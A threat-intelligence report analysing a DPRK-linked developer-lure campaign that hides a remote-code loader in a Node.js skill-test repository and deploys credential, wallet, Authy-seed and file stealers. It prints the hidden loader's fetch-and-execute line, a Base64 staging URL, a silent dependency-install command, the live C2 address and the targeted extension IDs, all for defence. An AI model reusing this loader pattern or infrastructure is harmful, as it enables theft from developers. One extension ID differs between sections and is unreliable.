---
title: "Triple Fork: OtterCookie Variant Delivered via Bitbucket Developer Lure"
date: 2026-03-26
author: "ThreatProphet"
description: "Analysis of a Contagious Interview campaign delivering an OtterCookie-family three-child loader via a Bitbucket skill-test lure, targeting developer credentials, cryptocurrency wallets, and 2FA seeds across all major platforms."
tags:
  - contagious-interview
  - ottercookie
  - beavertail
  - famous-chollima
  - javascript
  - linkedin-lure
  - bitbucket
  - node-js
  - crypto-stealer
  - npoint
  - cloudzy
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.002
  - T1059.007
  - T1059.001
  - T1071.001
  - T1555.003
  - T1115
  - T1083
  - T1105
  - T1036
  - T1140
  - T1027.009
  - T1057
  - T1041
report_id: "TP-2026-008"
showToc: true
---

> *"The work was divided in three: one to steal, one to search, and one to command."*

## Executive Summary

A threat actor operating under the Bitbucket handle **blocwryte** targeted developers via a LinkedIn recruitment lure that redirected victims to a fabricated skill-test repository: `bitbucket.org/blocwryte/challenge`. The project presented as a plausible backend Node.js application. Concealed within its middleware layer was a two-stage remote code execution primitive that fetched and executed a heavily obfuscated JavaScript payload from the npoint.io free JSON storage service — a staging host documented in prior Contagious Interview reporting — and passed the result directly into a dynamic execution sink named `executeHandler`. The naming was deliberate misdirection: `executeHandler` sounds like a routing utility, and the JSON key carrying the payload was named `cookie`, lending the appearance of ordinary session management to what was in fact a remote code execution call.

The Stage 1 payload was obfuscated with `javascript-obfuscator` and, on deobfuscation, revealed a modular three-child loader architecture. The parent loader spawned three independent malware modules as detached Node.js child processes fed through `stdin` — meaning the child payloads never touch disk as standalone files during execution. Each child is identified by a temp-directory lock file and kept to a single running instance via PID management. The three modules divide responsibilities cleanly: **ldbScript** harvests Chromium-family browser credentials, Web Data, and cryptocurrency wallet extension storage across thirteen browser families; **autoUploadScript** performs a broad recursive filesystem sweep for sensitive files matching wallet, credential, seed-phrase, and document patterns; and **socketScript** establishes a persistent Socket.IO control channel, beacons host metadata to attacker infrastructure, monitors the clipboard on Windows, macOS, and Linux, executes arbitrary attacker commands, and uploads files on demand. All three exfiltrate to a single C2 IP, **144.172.110.132**, distributed across three ports with distinct functional roles.

The browser extension targeting list deserves particular attention. The payload targets 39 extensions across a broad multi-chain sweep — Ethereum, Solana, TON, Tron, Cardano, Cosmos, StarkNet, Harmony, and others — but includes two targets not typically associated with basic wallet theft. **Authy** (`aeachknmefphepccionboohckonoeemg`), a TOTP-based 2FA manager, is included alongside the wallet extensions; stealing its local storage yields the attacker MFA seeds for exchanges, email accounts, and custodial services, substantially broadening the blast radius beyond on-chain assets. **Ronin Wallet** (`efbglgofoippbgcjepnhiblaibcnclgk`), the Axie Infinity bridge wallet drained of approximately $625M in the 2022 Lazarus Group operation, is also explicitly targeted — indicating continued operator focus on the same gaming and DeFi community that was victimised in that operation.

The C2 IP (`144.172.110.132`) resolves to `132.110.172.144.static.cloudzy.com`, confirming hosting on **Cloudzy** infrastructure (resold via RouterHosting LLC, AS14956, Utah, US). Cloudzy has been documented in prior security research as a hosting provider whose infrastructure has been repeatedly leveraged by nation-state threat actors. The lure repository contains a single commit authored by `IronStone <irontree322@gmail.com>`, timestamped 2026-03-02 at 11:03 EST, with no prior history — consistent with a purpose-built lure repository created shortly before deployment. Behavioral fingerprinting strongly matches the **OtterCookie** tooling family as documented by Cisco Talos and NTT Security, and is assessed **consistent with Contagious Interview / Deceptive Development operations linked to Famous Chollima (DPRK)**. Attribution is assessed at **medium confidence** based on TTP overlap with published OtterCookie reporting; no direct infrastructure tie to a named prior campaign was established during this analysis.

---

## Attack Overview

### Initial Contact

The victim persona was approached on LinkedIn with a standard Contagious Interview recruitment pretext. After an initial exchange, the actor directed the target to clone and run `bitbucket.org/blocwryte/challenge` as part of a technical assessment. The repository presented as a Node.js backend project — a plausible format for a developer skill test, and one that creates a natural justification for executing `npm start` without close scrutiny.

The `blocwryte` Bitbucket account shows no activity beyond this repository. The single commit (`cf384ff`) was pushed on 2026-03-02 with no prior history, consistent with an account created solely for this lure.

### Kill Chain

1. Victim is contacted on LinkedIn by a fake recruiter and directed to clone `bitbucket.org/blocwryte/challenge`.
2. `npm start` executes `node ./src/server.js`, which loads `app.js` and registers `syncConfigHandler` as application middleware.
3. At startup, `syncConfigHandler` Base64-decodes the `CONFIG_ENDPOINT` environment variable from `src/config/env.js` and issues an `axios.get()` to the decoded URL: `https://api.npoint.io/77363e668161581fb2de`.
4. The npoint.io endpoint returns a JSON blob; the `cookie` field contains the obfuscated Stage 1 payload string.
5. `executeHandler(res.data.cookie)` receives the payload and executes it within the Node.js runtime.
6. The Stage 1 payload deobfuscates itself, probes the environment via a `Function("return this")()` sandbox-escape ladder, and installs a persistent callback via `setInterval`.
7. The Stage 2 loader builds three child payloads as in-memory JavaScript strings, creates a temp lock file for each, and spawns three detached `node -` processes, writing each payload over `stdin`.
8. **ldbScript** enumerates Chromium-family browser profiles, extracts login data, Web Data, and wallet extension storage, and uploads to `144.172.110.132:8085/upload`.
9. **autoUploadScript** recursively scans the filesystem for sensitive files and uploads matching content to `144.172.110.132:8086/upload`.
10. **socketScript** beacons host metadata to `144.172.110.132:8087/api/notify`, connects to the Socket.IO C2 at `ws://144.172.110.132:8087`, and begins polling the clipboard and awaiting operator commands.

---

## Technical Analysis

### Stage 1: Delivery Loader (`src/middlewares/handle-global-error.js`)

`handle-global-error.js` does contain a legitimate error handler. `handleGlobalError` is a standard Express error middleware that catches `ApiError` instances and returns structured JSON responses — exactly what a developer would expect to find in a file with this name. The malicious function, `syncConfigHandler`, is injected into the same file alongside it. This is more subtle than placing the loader in a file with no legitimate purpose: a developer skimming the file sees real, functional error handling code and is less likely to read further. The two functions coexist in the same module, and only `syncConfigHandler` is the threat.

The loader reads the Base64-encoded C2 URL from `src/config/env.js`. Every other configuration value in the file reads from `process.env`, making this entry immediately anomalous — it is the only value hardcoded unconditionally, with no environment variable fallback:

```javascript
// src/config/env.js (excerpt)
const env = {
  PORT: process.env.PORT,
  DATABASE_URL: process.env.DATABASE_URL,
  JWT_ACCESS_TOKEN_SECRET: process.env.JWT_ACCESS_TOKEN_SECRET,
  // ... (all other fields read from process.env)
  CONFIG_ENDPOINT: "aHR0cHM6Ly9hcGkubnBvaW50LmlvLzc3MzYzZTY2ODE2MTU4MWZiMmRl", // <-- hardcoded
  RESEND_API_KEY: process.env.RESEND_API_KEY,
};
```

Decoded: `https://api.npoint.io/77363e668161581fb2de`

The absence of a `process.env` fallback means there is no legitimate deployment scenario for this value — it exists solely to deliver the C2 URL. The surrounding legitimate-looking config keys serve as camouflage, embedding the malicious entry in a file a developer would expect to contain only environment variable mappings.

The loader then fetches and executes whatever the endpoint returns:

```javascript
axios.get(atob(env.CONFIG_ENDPOINT))
  .then((res) => executeHandler(res.data.cookie));
```

Three evasion decisions are packed into these two lines. `atob()` decodes the URL at runtime, preventing static extraction from a string scan. The JSON key `cookie` disguises the payload as session data. And `executeHandler` — the execution sink — is named to suggest a utility dispatcher rather than a dynamic code runner. The outer `try/catch` wrapping the fetch silently discards any network errors under the message `"Runtime config error."`, ensuring the loader fails without raising an exception visible to the developer.

The npoint.io endpoint returned the same payload on both probes (2026-03-26T11:09 and 2026-03-26T11:35), indicating the Stage 1 payload had not been rotated at time of analysis.

### Stage 1: Payload Obfuscation

The payload delivered in the `cookie` field is processed with `javascript-obfuscator` (the npm package), a tool that has become the de facto obfuscation layer across the Contagious Interview ecosystem. Indicators in the output:

- Named offset-table functions (`Nn`, `Nu`, `Nj`, `Ng`, `NP`, `D0`, `Ns`, `Nv`) operating on a central string array
- Numeric constant arrays with computed index lookups replacing all string literals
- Hex-escaped string literals (`\x29\x3b`, `\x6c`)
- Environment detection via `Function("return this")()` — a classic sandbox-escape probe — with fallback to `window`, followed by a boolean flag `o = !![]`
- A closing `setInterval` or `setTimeout` registration via constructed method name: `Q[...+'\\x6c'](R, ...)`

The environment probe is significant. Using `Function("return this")()` to retrieve the global object rather than referencing it directly is a technique used to distinguish browser and Node.js contexts from sandboxed analysis environments where the `Function` constructor may be restricted. The payload only proceeds if this probe succeeds.

### Stage 2: Three-Child Loader Architecture

On deobfuscation, the Stage 1 payload reveals a parent loader that constructs three complete JavaScript programs as string literals and launches each as a detached child process. The helper function responsible for spawning children:

1. Derives a per-child lock path under `os.tmpdir()`: `pid.${t}.1.lock`, `pid.${t}.2.lock`, `pid.${t}.3.lock`
2. Reads any existing lock file and checks whether the stored PID is still alive via `process.kill(pid, 0)`
3. If a live prior instance is found, terminates it with `SIGTERM`
4. Spawns a new detached `node -` process using `process.execPath` as the interpreter
5. Writes the payload source string into the child process over `stdin` and closes the pipe

This architecture has two significant operational properties. First, child payloads execute entirely from memory via `stdin` — they are never written to disk as standalone `.js` files during normal operation, complicating filesystem-based detection. Second, the lock file mechanism guarantees that only one instance of each child runs at a time across repeated invocations of `npm start`, preventing duplicate processes from accumulating and alerting the victim. The `t` variable in the lock path is a per-session token, meaning lock files vary across runs but remain consistent within a session.

The parent loader also attempts a preemptive dependency install on startup, silently and without saving to `package.json`:

```bash
npm install sql.js socket.io-client form-data axios \
  --no-save --no-warnings --no-progress --loglevel silent
```

This single command provisions all dependencies required by all three child payloads before they are launched, ensuring each child finds its dependencies present without needing its own install step.

### Stage 2: `ldbScript` — Browser Credential and Wallet Harvester

`ldbScript` is the credential collection module. It enumerates profile directories for thirteen Chromium-family browsers across Windows, macOS, Linux, and WSL environments:

Chrome, Brave, AVG Browser, Edge, Opera, Opera GX, Vivaldi, Kiwi, Yandex, Iridium, Comodo Dragon, SRWare Iron, and Chromium.

Within each detected profile, it targets five filesystem artifacts: `Login Data`, `Login Data For Account`, `Web Data`, `Local Extension Settings`, and `Local Storage/leveldb`. Login Data and Web Data are SQLite databases queried via `sql.js` (dynamically installed if absent: `npm install sql.js --no-save --no-warnings --no-save --no-progress --loglevel silent`). On Windows, encrypted credential fields are decrypted using a PowerShell routine that invokes `System.Security.Cryptography.ProtectedData`, passed to the shell as a Base64-encoded command via `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <base64>`.

Local Extension Settings directories are harvested wholesale, capturing the full LevelDB storage for every installed extension. `ldbScript` includes a hardcoded list of 39 target extension IDs; any profile containing storage for a listed extension is flagged for upload. The list covers a broad multi-chain wallet sweep — detailed in the IOC section — but two entries warrant explicit attention:

**Authy** (`aeachknmefphepccionboohckonoeemg`) is a TOTP-based two-factor authentication manager, not a cryptocurrency wallet. Capturing its local storage yields the attacker cryptographic TOTP seeds for every service the victim has enrolled, including exchange accounts, email providers, and custodial wallets. This extends the attacker's reach well beyond on-chain assets to any account secured by Authy 2FA.

**Ronin Wallet** (`efbglgofeippbgcjepnhiblaibcnclgk`) is the browser wallet for the Axie Infinity ecosystem and the Ronin bridge. The Ronin bridge was drained of approximately $625M in March 2022 in an operation attributed to Lazarus Group. The continued presence of Ronin Wallet in this target list, four years later, indicates sustained operator interest in the same gaming and DeFi community previously victimised in that operation.

Harvested data is staged in a temp directory matching the pattern `.upload_<timestamp>_<random>` and uploaded to `http://144.172.110.132:8085/upload`.

### Stage 2: `autoUploadScript` — Sensitive File Harvester

`autoUploadScript` performs a broad recursive filesystem sweep, beginning with priority directories (Desktop, Documents, Downloads, home root) and extending to all accessible paths. On Windows and WSL environments it additionally enumerates mounted Windows drives via `/mnt/c/Users` and `/proc/version` detection.

File matching applies against an extensive combined keyword and extension pattern list targeting: cryptocurrency wallet files and seed phrases, `.env` files and application secrets, API tokens and private keys, browser cookies, SQLite databases, screenshots, and office documents. The scope is deliberately maximalist — this is a wealth-maximising sweep rather than a targeted collection, consistent with documented Contagious Interview financial collection objectives.

Upload requests to `http://144.172.110.132:8086/upload` include three non-standard HTTP headers that function as operator telemetry:

```
userkey: 303
t: 3
```

Together with encoded hostname and file path fields and an HMAC validation token computed against the hardcoded secret `SuperStr0ngSecret@)@^`, these headers allow the attacker's collection backend to attribute uploads to specific campaigns and victims. The values `userkey: 303` and `t: 3` appear to function as campaign or operator slot identifiers — a backend partitioning mechanism consistent with the infrastructure management patterns documented in prior Contagious Interview reporting.

### Stage 2: `socketScript` — C2 and Control Module

`socketScript` is the persistent command-and-control component. On startup it installs `socket.io-client` if not present, then executes three actions in sequence: a host beacon, a persistent WebSocket connection, and clipboard monitoring.

The host beacon is an HTTP POST to `http://144.172.110.132:8087/api/notify` carrying the victim's hostname, platform, username (retrieved on Windows via `cmd.exe /c echo %USERNAME%`), and session metadata. Events throughout the session are logged to `http://144.172.110.132:8087/api/log`.

The WebSocket connection to `ws://144.172.110.132:8087` registers handlers for three inbound operator commands:

- `whour` — triggers a `whoIm` response with current host state
- `command` — executes arbitrary shell commands via `child_process.exec` and returns output
- `processControl` — manages child process lifecycle and emits `processStatus` events

File upload on operator demand routes to `http://144.172.110.132:8085/api/upload-file`, sharing the upload port with `ldbScript`.

Clipboard monitoring runs as a platform-aware polling loop. On Windows it invokes a hidden PowerShell window using `System.Windows.Forms.Clipboard`; on macOS it calls `pbpaste`; on Linux it attempts `xclip -selection clipboard -o` with fallback to `xsel --clipboard --output`. Any clipboard content change is captured and reported over the C2 channel. Given the wallet-focused targeting profile of the campaign, clipboard monitoring is most likely aimed at intercepting cryptocurrency addresses copied during transaction preparation — a technique allowing the attacker to substitute attacker-controlled addresses before the victim pastes.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.002 | Spearphishing Link | Initial Access | LinkedIn recruitment lure directing victim to Bitbucket |
| T1059.007 | JavaScript | Execution | Node.js runtime; `executeHandler` execution sink; `node -` child processes |
| T1059.001 | PowerShell | Execution | Credential decryption (`ProtectedData`); clipboard access; encoded commands |
| T1140 | Deobfuscate/Decode Files or Information | Defense Evasion | `atob()` URL decoding; `javascript-obfuscator` string array rotation |
| T1036 | Masquerading | Defense Evasion | `handle-global-error.js` filename; `executeHandler` function name; `cookie` JSON key |
| T1027.009 | Obfuscated Files: Embedded Payloads | Defense Evasion | Three child payloads built as in-memory string literals in parent loader |
| T1105 | Ingress Tool Transfer | Command and Control | Dynamic silent `npm install` of `sql.js`, `socket.io-client`, `form-data`, `axios` |
| T1057 | Process Discovery | Discovery | Lock file PID checks via `process.kill(pid, 0)` |
| T1083 | File and Directory Discovery | Discovery | Recursive sensitive-file sweep in `autoUploadScript`; WSL-aware drive enumeration |
| T1555.003 | Credentials from Web Browsers | Credential Access | Login Data, Web Data extraction across 13 Chromium-family browsers |
| T1115 | Clipboard Data | Collection | Platform-aware clipboard polling in `socketScript` |
| T1071.001 | Application Layer Protocol: Web Protocols | Command and Control | HTTP beacon/log/upload; Socket.IO WebSocket C2 |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Browser data, files, and clipboard content exfiltrated to `144.172.110.132` |

---

## Infrastructure Analysis

### Network Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `144.172.110.132` | IPv4 | C2 server; all three modules; Cloudzy/RouterHosting LLC, AS14956, Utah US |
| `132.110.172.144.static.cloudzy.com` | PTR record | Reverse DNS for C2 IP; confirms Cloudzy hosting |
| `https://api.npoint.io/77363e668161581fb2de` | URL | Stage 1 payload staging; `cookie` field carries obfuscated JS |
| `api.npoint.io` | Domain | Free JSON storage service; abused as staging host |
| `http://144.172.110.132:8085` | URL | Browser data and file upload (ldbScript, socketScript) |
| `http://144.172.110.132:8086` | URL | Sensitive file upload (autoUploadScript) |
| `http://144.172.110.132:8087` | URL | Beacon, logging, Socket.IO C2 (socketScript) |
| `ws://144.172.110.132:8087` | WebSocket | Socket.IO persistent control channel |

The C2 IP is hosted on **Cloudzy**, a virtual private server provider whose infrastructure has been documented in prior security research as having been leveraged by multiple nation-state threat clusters. The PTR record follows Cloudzy's standard static assignment format. Cloudzy also serves legitimate customers; Cloudzy hosting alone does not constitute attribution evidence, but its presence alongside the behavioral fingerprint is a corroborating signal.

Port assignment reflects deliberate functional separation: port 8085 handles both browser data upload (`ldbScript`) and on-demand file retrieval (`socketScript`), port 8086 handles the bulk filesystem sweep (`autoUploadScript`), and port 8087 handles the real-time C2 channel. This separation likely reflects distinct backend processing pipelines for different data types on the operator's collection infrastructure.

### Actor Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `bitbucket.org/blocwryte/challenge` | Repository URL | Lure repository; single commit; no prior activity |
| `blocwryte` | Bitbucket handle | Operator or access-broker persona |
| `IronStone` | Commit author name | Single commit, `cf384ff`, 2026-03-02T11:03:19-0500 |
| `irontree322@gmail.com` | Commit author email | Disposable Gmail; low-confidence actor indicator |

---

## Indicators of Compromise

> All indicators assessed **High confidence** unless noted.

### Network Indicators

| Indicator | Type | Confidence |
|---|---|---|
| `144.172.110.132` | IPv4 | High |
| `api.npoint.io/77363e668161581fb2de` | URL | High |
| `aHR0cHM6Ly9hcGkubnBvaW50LmlvLzc3MzYzZTY2ODE2MTU4MWZiMmRl` | Base64 string | High |
| `ws://144.172.110.132:8087` | WebSocket endpoint | High |

### File and Host Indicators

| Indicator | Type | Notes |
|---|---|---|
| `pid.${t}.1.lock` | Lock file pattern | `ldbScript` singleton lock; `os.tmpdir()` |
| `pid.${t}.2.lock` | Lock file pattern | `autoUploadScript` singleton lock |
| `pid.${t}.3.lock` | Lock file pattern | `socketScript` singleton lock |
| `.upload_<timestamp>_<random>` | Temp directory pattern | `ldbScript` staging directory |
| `handle-global-error.js` | Filename | Malicious loader masquerading as error handler |
| `env.js` | Filename | Contains Base64-encoded C2 URL |

### Repository Indicators

| Indicator | Type | Notes |
|---|---|---|
| `bitbucket.org/blocwryte/challenge` | Repository | Lure repository; archived 2026-03-26 |
| `blocwryte` | Bitbucket account | Operator persona; low prior activity |
| `irontree322@gmail.com` | Email | Commit author; Low confidence actor indicator |
| `IronStone` | Handle | Commit author name; Low confidence actor indicator |

### File Indicators

| SHA256 | Filename | Notes |
|---|---|---|
| `790277d4067c6fd0a36f450ae8c83bd2e4e5f812eb3a86f83c9b9a1c67f9a63e` | `handle-global-error.js` | Stage 1 loader; masquerading as error handler middleware |
| `17fc8a5acc76fcbf9f2dbc0f68d2e80cd1b5187f8ccab3d2a014898dadc44fc8` | `env.js` | Contains Base64-encoded C2 URL |
| `8c1d99ea78e07c8ec88671a56729d19fcff0def699c3b8dc3b42861112497293` | `server.js` | Application entrypoint |
| `df8768c18dce2140b5a1df78dcb821f103409b6c5bbf86f09bf1ceefb6e75c43` | `stage1-npoint-body-20260326T113524Z.json` | Stage 1 payload body as delivered from npoint.io |

### Hardcoded Constants

| Value | Context | Notes |
|---|---|---|
| `userkey: 303` | HTTP upload header | Campaign or operator slot identifier |
| `t: 3` | HTTP upload header | Campaign identifier |
| `SuperStr0ngSecret@)@^` | HMAC secret | Upload request validation token; strong cross-campaign fingerprint |

### Targeted Browser Extension IDs

| Extension ID | Wallet / App | Chain |
|---|---|---|
| `nkbihfbeogaeaoehlefnkodbefgpgknn` | MetaMask | Ethereum/EVM |
| `ejbalbakoplchlghecdalmeeeajnimhm` | MetaMask (Edge) | Ethereum/EVM |
| `ppbibelpcjmhbdihakflkdcoccbgbkpo` | MetaMask Flask | Ethereum (developer) |
| `acmacodkjbdgmoleebolmdjonilkdbch` | Coinbase Wallet | Multi-chain |
| `hnfanknocfeofbddgcijnmhnfnkdnaad` | Coinbase Wallet (legacy) | Multi-chain |
| `bfnaelmomeimhlpmgjnjophhpkkoljpa` | Binance Wallet | BNB Chain/EVM |
| `ibnejdfjmmkpcnlpebklmnkoeoihofec` | TronLink | Tron |
| `egjidjbpglichdcondbcbdnbeeppgdph` | XDEFI / Ctrl Wallet | Multi-chain |
| `nphplpgoakhhjchkkhmiggakijnkhfnd` | Phantom | Solana |
| `lgmpcpglpngdoalbgeoldeajfclnhafa` | Sollet | Solana (deprecated) |
| `jmbkjchcobfffnmjboflnchcbljiljdk` | Slope Wallet | Solana |
| `omaabbefbmiijedngplfjmnooppbclkk` | TON Wallet | TON |
| `khpkpbbcccdmmclmpigdgddabeilkdpd` | Keeper Wallet | TON |
| `penjlddjkjgpnkllboccdgccekpkcbin` | OpenMask | TON |
| `bhhhlbepdkbapadjdnnojkbgioiodbic` | Rabby Wallet | EVM multi-chain |
| `agoakfejjabomempkjlepdflaleeobhb` | Bitget Wallet (BitKeep) | Multi-chain |
| `afbcbjpbpfadlkmhmclhkeeodmamcflc` | MathWallet | Multi-chain |
| `fhkbkphfeanlhnlffkpologfoccekhic` | OKX Wallet | Multi-chain |
| `fhbohimaelbohpjbbldcngcnapndodjp` | 1inch Wallet | EVM |
| `dlcobpjiigpikoobohmabehhmhfoodbb` | Liquality | Multi-chain |
| `mcohilncbfahbmgdjkbpemcciiologcge` | Enkrypt | Multi-chain |
| `mopnmbcafieddcagagdcbnhejhlodfdd` | Zeal Wallet | EVM |
| `aholpfdialjgjfhomihkjbmgjidlcdno` | Equal Wallet | EVM |
| `jnjpmcgfcfeffkfgcnjefkbkgcpnkpab` | Nifty Wallet | Ethereum |
| `aflkmhkiijdbfcmhplgifokgdeclgpoi` | Jaxx Liberty | Multi-chain |
| `fldfpgipfncgndfolcbkdeeknbbbnhcc` | Guarda | Multi-chain |
| `jiidiaalihmmhddjgbnbgdfflelocpak` | Coin98 | Multi-chain |
| `ejjladinnckdgjemekebdpeokbikhfci` | Keplr | Cosmos |
| `hifafgmccdpekplomjjkcfgodnhcellj` | CLV Wallet | Polkadot/EVM |
| `cgbogdmdefihhljhfeffkljbghamglni` | Yoroi | Cardano |
| `fhmfendgdocmcbmfikdcogofphimnkno` | Nami | Cardano |
| `hmeobnfnfcmdkdcmlblgagmfpfboieaf` | Harmony ONE Wallet | Harmony |
| `dmkamcknogkgcdfhhbddcghachkejeap` | Braavos | StarkNet |
| `gjnckgkfmgmibbkoficdidcljeaaaheg` | EVER Wallet | Everscale |
| `kpkmkbkoifcfpapmleipncofdbjdpice` | Polymesh Wallet | Polymesh |
| `jblndlipeogpafnldhgmapagcccfchpi` | Hiro Wallet | Bitcoin/Stacks |
| `ibnejdfjmmkpcnlpebklmnkoeoihofec` | TronLink | Tron |
| `efbglgofoippbgcjepnhiblaibcnclgk` | **Ronin Wallet** | **Axie/Ethereum** |
| `aeachknmefphepccionboohckonoeemg` | **Authy (2FA)** | **TOTP seeds — not a wallet** |

---

## Attribution Assessment

**Assessed confidence: Medium**

The behavioral fingerprint of this sample aligns closely with the **OtterCookie** tooling family as documented by Cisco Talos (October 2025) and NTT Security (January and May 2025). The specific design elements present in this sample that match published OtterCookie descriptions include:

- A parent loader that constructs child payloads from embedded JavaScript strings and launches them as detached `node -` processes fed through `stdin`
- A Socket.IO-based control module with host beaconing, clipboard theft, arbitrary command execution, and file upload
- A dedicated file-harvesting module performing recursive filesystem sweeps
- A browser credential and cryptocurrency wallet extension theft module

All three structural components described in Cisco Talos reporting — the socket control module, the file upload module, and the browser data module — are present in this sample with consistent architecture. The `socket.io-client` dependency, the `api/notify` and `api/log` endpoint naming convention, and the stdin-fed detached process spawning pattern all appear in prior OtterCookie public analysis.

OtterCookie and the broader BeaverTail ecosystem are associated in public reporting with **Contagious Interview / Deceptive Development**, a persistent DPRK-linked developer-lure campaign attributed to **Famous Chollima / WaterPlum** by Cisco Talos, NTT Security, CrowdStrike, and others. The lure tradecraft — LinkedIn recruitment persona, Bitbucket-hosted skill-test repository, `npm start` as the execution trigger — is the defining signature of Contagious Interview as documented since its first public identification by Palo Alto Unit42 in November 2023 and continuously active at time of writing.

Two infrastructure observations provide corroborating signals without constituting independent attribution. The C2 IP (`144.172.110.132`) is hosted on Cloudzy, a provider whose infrastructure has appeared in prior nation-state threat actor reporting. No direct tie between this specific IP and a named prior campaign was established during this analysis. The lure repository (`blocwryte/challenge`) contains a single commit dated 2026-03-02, consistent with a purpose-built lure created within weeks of deployment — a pattern uniformly observed across documented Contagious Interview lure repositories.

The hardcoded constant `SuperStr0ngSecret@)@^`, used as an HMAC validation token in upload requests, is a strong cross-sample fingerprint. If this value appears in other public OtterCookie sample dumps, it would constitute a direct code-sharing link rather than a TTP similarity inference. Researchers with access to broader sample repositories are encouraged to search for this string.

Attribution should not be asserted beyond TTP similarity without additional corroborating intelligence. TTP similarity is not confirmed attribution.

**Prior reporting:**
- [Cisco Talos — BeaverTail and OtterCookie evolve with a new Javascript module](https://blog.talosintelligence.com/beavertail-and-ottercookie/) (2025-10-16)
- [NTT Security — OtterCookie, new malware used in Contagious Interview campaign](https://jp.security.ntt/insights_resources/tech_blog/en-contagious-interview-ottercookie/) (2025-01-16)
- [NTT Security — Additional Features of OtterCookie Malware Used by WaterPlum](https://jp.security.ntt/tech_blog/en-waterplum-ottercookie) (2025-05-08)
- [Palo Alto Unit42 — Contagious Interview](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
- [MITRE ATT&CK — Contagious Interview (G1052)](https://attack.mitre.org/groups/G1052/)
- [CISA Advisory — TraderTraitor: North Korean State-Sponsored APT Targets Blockchain Companies](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a)

---

## Remediation

### If You Ran the Repository

- **Isolate the machine immediately.** Disconnect from all networks before taking any further action.
- **Assume all browser-stored credentials are compromised.** This includes passwords, session cookies, and autofill data for every profile in every Chromium-family browser on the machine. Rotate all credentials from a clean device.
- **Assume all cryptocurrency wallet seeds and private keys are compromised.** Any wallet whose extension storage was accessible from a targeted browser profile should be treated as known to the attacker. Transfer all assets to wallets generated on a clean, air-gapped machine using a freshly generated seed phrase immediately. Do not reuse any wallet derived from a compromised seed.
- **Assume your Authy TOTP seeds are compromised.** If Authy was installed in a targeted browser, the attacker may hold your MFA seeds. Rotate 2FA on every enrolled account from a clean device, preferring hardware keys where available.
- **Audit for persisted lock files.** Check `os.tmpdir()` (typically `/tmp` on Linux/macOS, `%TEMP%` on Windows) for files matching `pid.*.lock`. Their presence confirms at least one child payload ran.
- **Preserve forensic evidence** before remediation: shell history, process logs, and the temp directory. Capture running processes at the time of isolation if possible.
- **Reimage.** If compromise is confirmed, restore from a known-good backup predating repository execution, or perform a clean OS install. The payload's memory-first execution model and silent dependency installation make complete manual remediation unreliable.

### Network-Level Detection

- Block and alert on all outbound connections to `144.172.110.132` on any port.
- Alert on outbound connections from Node.js processes to `api.npoint.io`, `jsonkeeper.com`, or any other free JSON storage service. Legitimate Node.js applications do not fetch executable JavaScript from these hosts.
- Create detection rules for HTTP POST requests from Node.js processes containing the header `userkey: 303` or `SuperStr0ngSecret@)@^` in any field.
- Alert on outbound WebSocket connections from developer workstations to non-standard ports (8085–8087 range).
- Monitor for `node -` process invocations (the literal `-` argument indicating stdin-fed execution) spawned from other Node.js processes. This pattern is not typical of legitimate application code.

### Host-Level Detection and Hardening

- Search for lock files matching `pid.*.1.lock`, `pid.*.2.lock`, and `pid.*.3.lock` in the system temp directory. Any match indicates an active or prior ldbScript, autoUploadScript, or socketScript instance.
- Monitor for `npm install` invocations that include `--no-save --loglevel silent` combined with `sql.js` or `socket.io-client`. Legitimate applications declare their dependencies in `package.json`; silent runtime installation of these specific packages is a strong indicator of compromise.
- Run developer assessments from unknown sources exclusively in an isolated VM or container with restricted network egress and ephemeral storage. `npm start` in an untrusted repository must never be treated as a safe operation. The entire malicious chain in this campaign executes silently within the normal startup sequence — there is no user prompt, no permission dialog, and no visible anomaly.


*TLP:CLEAR — This report may be freely shared. Attribution assessments are tentative and based on TTP similarity only. All IOCs are provided for defensive purposes.*

*Report ID: TP-2026-008 | Published: 2026-03-26 | Author: [ThreatProphet](https://threatprophet.com)*
